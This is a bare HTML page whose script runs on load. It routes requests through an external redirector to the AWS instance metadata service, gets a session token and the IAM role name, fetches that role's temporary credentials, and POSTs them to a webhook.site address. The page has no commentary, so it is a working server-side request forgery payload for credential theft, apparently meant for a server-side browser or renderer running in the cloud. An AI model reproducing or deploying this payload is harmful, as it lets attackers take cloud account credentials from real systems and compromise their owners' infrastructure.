<html>
  <body>
    <script>
      async function fetchIMDS() {
        try {
          // 1. Token
          let res1 = await fetch("http://13.221.230.104/redir.php?url=" + encodeURIComponent("http://169.254.169.254/latest/api/token"), {
            method: "PUT",
            headers: {
              "X-aws-ec2-metadata-token-ttl-seconds": "21600"
            }
          });
          let token = await res1.text();

          // 2. Get IAM role
          let res2 = await fetch("http://13.221.230.104/redir.php?url=" + encodeURIComponent("http://169.254.169.254/latest/meta-data/iam/security-credentials/"), {
            headers: {
              "X-aws-ec2-metadata-token": token
            }
          });
          let role = (await res2.text()).trim();

          // 3. Get credentials
          let res3 = await fetch("http://13.221.230.104/redir.php?url=" + encodeURIComponent(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`), {
            headers: {
              "X-aws-ec2-metadata-token": token
            }
          });
          let creds = await res3.text();

          // 4. Send to webhook
          await fetch("https://webhook.site/565628b3-9556-8e01-88059325cb8d", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({creds: creds})
          });

          console.log("Credentials sent successfully");
        } catch(e) {
          console.error("Error:", e);
        }
      }
      fetchIMDS();
    </script>
  </body>
</html>
